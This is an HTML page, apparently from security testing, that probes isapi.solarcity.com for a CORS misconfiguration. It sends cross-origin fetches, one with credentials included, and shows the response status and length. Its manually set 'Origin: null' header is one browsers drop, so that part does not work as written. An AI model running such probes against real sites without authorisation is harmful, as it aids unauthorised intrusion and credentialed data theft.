<!DOCTYPE html>
<html>
<head>
<title>CORS Test - isapi.solarcity.com</title>
</head>
<body>
<h1>CORS Vulnerability Test</h1>
<div id="result"></div>

<script>
// Test 1: Basic CORS request
fetch('https://isapi.solarcity.com/', {
    method: 'GET',
    mode: 'cors',
    headers: {
        'Origin': 'null'
    }
})
.then(response => {
    document.getElementById('result').innerHTML += 
        '<p>Test 1 - Status: ' + response.status + '</p>';
    return response.text();
})
.then(data => {
    document.getElementById('result').innerHTML += 
        '<p>Test 1 - Data received: ' + data.length + ' characters</p>';
})
.catch(error => {
    document.getElementById('result').innerHTML += 
        '<p>Test 1 - Error: ' + error + '</p>';
});

// Test 2: With credentials
fetch('https://isapi.solarcity.com/', {
    method: 'GET',
    mode: 'cors',
    credentials: 'include',
    headers: {
        'Origin': 'null'
    }
})
.then(response => {
    document.getElementById('result').innerHTML += 
        '<p>Test 2 - Status: ' + response.status + '</p>';
})
.catch(error => {
    document.getElementById('result').innerHTML += 
        '<p>Test 2 - Error: ' + error + '</p>';
});
</script>
</body>
</html>
